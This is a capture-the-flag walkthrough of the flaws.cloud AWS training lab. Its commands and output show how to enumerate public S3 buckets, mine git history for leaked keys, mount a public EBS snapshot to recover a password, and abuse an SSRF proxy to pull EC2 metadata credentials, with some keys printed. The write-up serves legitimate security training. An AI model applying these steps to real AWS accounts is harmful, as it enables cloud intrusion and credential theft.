## Level 1

> This level is *buckets* of fun. See if you can find the first sub-domain.
{: .prompt-info }

Begin with doing a `dig` of `flaws.cloud`, which returns the following &rarr; 

```
; <<>> DiG 9.16.1-Ubuntu <<>> flaws.cloud

```

Then do an `nslookup` for the IP found, which gives the following &rarr; 

```
219.212.92.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.
Authoritative answers can be found from:
```

This gives hint of a static website running from S3 at `s3-website-us-west-2.amazonaws.com`. This also confirms that the non-DNS URL for the challenge is at `flaws.cloud.s3-website-us-west-2.amazonaws.com`.

Now, a new profile for `flaws` can be created with the region set to `us-west-2` and given that S3 is being used, permissions can be checked using the following &rarr; 

```bash
# no sign request is used to call without credentials
awsn s3 ls s3://flaws.cloud --no-sign-request --profile flaws
```

This gives the result &rarr;

2017-02-26 19:59:28         46 robots.txt
2017-02-26 19:59:30       1051 secret-dd02c7c.html
```

`robots.txt` and `secret-dd02c7c.html` seem interesting.

These can be retrieved using the command &rarr; 

```bash
aws s3 cp s3://flaws.cloud/robots.txt ./
```

The robots file did not give anything but the secret file gave the link to the next level as `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`. Files can also be listed by directly going to `flaws.cloud.s3.amazonaws.com`.

---

## Level 2

> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.
{: .prompt-info }

Calling `s3 ls` again on the discovered bucket gives an access denied message &rarr; 

```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request
```

However, calling it with a valid profile lists the bucket which means that the bucket did not have proper permissions configured i.e., it allowed everyone to list items and get items. Retrieving the secret file gives the URL for the next level as &rarr; `http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud`.

---

## Level 3

> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
{: .prompt-info }

Listing the contents like previous parts gives a `.git` folder in the contents. Pulling that down as follows &rarr; 

```bash
aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git ./git_stuff/
```

Running a secret scan in all commits using &rarr; 

```bash
for i in $(git --no-pager log | grep "^commit" | cut -d ' ' -f2); do git checkout $i 1>/dev/null 2>/dev/null; zsh /persist/secret_scan.sh; done
```

This gives a secret &rarr; `access_keys.txt:1:AKIAJ3...JKT7SA` and `access_keys.txt:2:secret_access_key OdNa7m+bqUvF3...kBpqcBTTjqwP83Jys` 

Using this as a profile, all S3 buckets can be listed using &rarr; 

```bash
awsn s3 ls --proile flaws
```

This gives the following output &rarr; 

```

```

This is all the S3 buckets which are also the further levels.

---

## Level 4

Visiting the bucket static website at &rarr; `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/`

> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
> 
> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
{: .prompt-info }

Using `aws sts get-caller-identitity --profile flaws` it gives the name of the account which is `backup`.

The questions says that a snapshot was made from the EC2 instance running the website. Using `aws ec2 describe-instances`, there is an instance owned by the backup user.

Listing all snapshots using `aws ec2 describe-snapshots` prints a ton of text, therefore, we filter using the owner ID such that the owner is the `backup` user. This is done by using `aws ec2 describe-snapshots --owner-id 975426262029` which gives the result &rarr; 

```json
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```

On checking the permissions for the volume using &rarr; 

```bash
awsn ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0b49342abd1bdcb89 --profile flaws --region us-west-2
```

The result is as follows &rarr; 

```json
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ],
    "SnapshotId": "snap-0b49342abd1bdcb89"
}
```

By default snapshots are private, and you can transfer them between accounts securely by specifying the account ID of the other account, but a number of people just make them public and forget about them.

Therefore, creating a volume from this within personal account using &rarr; 

```bash
awsn ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2
```

It must be in the same region as the snapshot because snapshots cannot be shared on other regions. The result is as follows &rarr; 

```json
{
    "AvailabilityZone": "us-west-2a",
    "CreateTime": "2022-04-01T15:48:24+00:00",
    "Encrypted": false,
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "State": "creating",
    "VolumeId": "vol-08854891211c6fec5",
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false
}
```

Now, an EC2 instance can be created from the console in the same AZ and then this volume can be attached to its storage.

Upon attaching the volume to the instance, it can be mounted as follows &rarr; 

```bash
lsblk
# This gives the volume /dev/xvdf1 as a new volume This should be from the snapshot
sudo mount /dev/xvdf1 /mnt
# This mounts it to the /mnt directory
```

Searching the file system, there is a `/home` directory for users on the system and the only user there is `ubuntu`. Since this snapshot was taken after the NGINX web server was configured and launched, there must be some data relevant to it. Under `ubuntu`â€˜s home directory, there is a script `setupNginx.sh` which has the following in it &rarr; 

```
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjy...Ju7rw5Ro68iE8M
```

This gives the password for the web server running in the EC2 instance at `4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`.

---

## Level 5

> This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:  
> `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/`  
> `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`

> See if you can use this proxy to figure out how to list the contents of the level6 bucket at `level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud` that has a hidden directory in it.
> 
> Visiting the page directly at `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/` gives the error of &rarr; 
> Level 6 is hosted in a sub-directory, but to figure out that directory, you need to play level 5 properly.
{: .prompt-info }

One of the most common ways to escalate an SSRF in an AWS Cloud environment is the (mis)use of the AWS Metadata API. Therefore, accessing the APIPA address, metadata can be obtained. There is a role under `security-credentials` i.e., the role of `flaws` has been attached to the EC2 instance.

Therefore, using the access key ID. secret access key and the session token, the role can effectively be assumed &rarr; 

```
[flaws2]
aws_access_key_id = ASIA6GG7PSQGUEOUS2GF
aws_secret_access_key = hrPK9j2qJ8nB3tSBsAwQ7/dauDE6dAOdRAwvaAUS
aws_session_token = IQoJb3JpZ2luX2VjEJn/....redacted....q+XnpTW+fg==
```

Using this to get the contents of the level6 S3 bucket as follows &rarr; 

```bash
 awsn s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ --profile flaws2
```

This gives the name of the directory where the next level is located.

---

## Level 6

> For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
> Access key ID: `AKIAJ...57Q3OBGA`
> Secret: `S2IpymMBlV....XrYxZYhP+dZ4ps+u`
{: .prompt-info }

Adding these credentials to the `credentials` file grants us the user `Level6`.

The SecurityAudit group can get a high level overview of the resources in an AWS account, but it's also useful for looking at IAM policies. To find information about the user, use &rarr; 

```bash
awsn iam get-user --profile level6flaws
```

This returns &rarr; 

```json
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMD...DWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16+00:00"
    }
}
```

Overview of the account can be retrieved using this role by using `iam get-account-summary` and all policies can be retrieved by using `list-policies`, however, that lists a complete bunch of policies (including AWS managed ones). Therefore, to retrieve the policies attached to the current user, use `iam list-user-attached-policies --user-name Level6` and this gives the result &rarr; 

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}
```

The MySecurityAudit policy is the one that allows us to do everything we are able to do. The other policy could be interesting. To get information about a policy use &rarr; 

```bash
awsn iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6flaws
```

This gives the information on the policy as &rarr; 

```json
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17+00:00",
        "UpdateDate": "2017-02-20T01:48:17+00:00",
        "Tags": []
    }
}
```

With the version ID known, information about that version can be retrieved using &rarr; 

```bash
awsn iam get-policy-version --version-id v4 --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6flaws
```

This gives the result &rarr; 

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17+00:00"
    }
}
```

This says that the policy allows the Level6 user to call `apigateway:GET` on the API Gateway for `restapis/*`. However, the user cannot perform a GET on the list of APIs themselves, just a specific one which has a policy attached to allow it.

Therefore, listing the capabilities using the policy `MySecurityAudit`, there are a number of services that the user can retrieve information for. Trying a few, lands us at Lambda, where functions can be listed as follows &rarr; 

```bash
awsn lambda list-functions --profile level6flaws --region us-west-2
```

This gives the result &rarr; 

```json
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            }
        }
    ]
}
```

Of the actions allowed in the `MySecurityAudit` policy, the user can also get the policy attached to the function. Therefore using the following to print the JSON policy &rarr; 

```bash
awsn lambda get-policy --function-name Level6 --profile level6flaws --region us-west-2 | python3 -c 'import json; input(); x = input(); print(json.loads(x.split(": ")[1][:-1]))' | python3 -m json.tool
```

This gives the policy as &rarr; 

```json
{
    "Version": "2012-10-17",
    "Id": "default",
    "Statement": [
        {
            "Sid": "904610a93f593b76ad66ed6ed82c0a8b",
            "Effect": "Allow",
            "Principal": {
                "Service": "apigateway.amazonaws.com"
            },
            "Action": "lambda:InvokeFunction",
            "Resource": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Condition": {
                "ArnLike": {
                    "AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
                }
            }
        }
    ]
}
```

This shows that the API Gateway is allowed to Invoke the Lambda function if the ARN matches `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`. This means that the Rest API name to invoke it must be `s33ppypa75`. Using API Gateway to get information for this API as follows &rarr; 

```bash
awsn apigateway get-rest-api --rest-api-id s33ppypa75 --profile level6flaws --region us-west-2
```

This gives the results as &rarr; 

```json
{
    "id": "s33ppypa75",
    "name": "Level6",
    "createdDate": "2017-02-26T18:21:35-06:00",
    "apiKeySource": "HEADER",
    "endpointConfiguration": {
        "types": [
            "EDGE"
        ]
    },
    "tags": {},
    "disableExecuteApiEndpoint": false
}
```

This shows that the Execute API Endpoint has not been disabled i.e., it can be reached via a URL to call the API. The default endpoint for Execute API for an API is as follows &rarr; 

```
https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/
```

Therefore, a stage name is needed, which can be retrieved from `get-stages` subcommand that gives the following result &rarr; 

```json
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "2017-02-26T18:26:08-06:00",
            "lastUpdatedDate": "2017-02-26T18:26:08-06:00"
        }
    ]
}
```

Next, the resources need to be identified within the stage that can be called. This is done by using the `get-resources` subcommand which gives the following result &rarr; 

```json
{
    "items": [
        {
            "id": "6m5gni",
            "parentId": "y8nk5v2z1h",
            "pathPart": "level6",
            "path": "/level6",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "y8nk5v2z1h",
            "path": "/"
        }
    ]
}
```

Therefore, the URL is as follows &rarr; 

```
https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```

If the last `level6` is not included, it is the root resource that is called, otherwise it is the user resource when specified. A curl request on this URL gives the following &rarr; 

```
Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
```

Thatâ€™s the end of the Challenge.
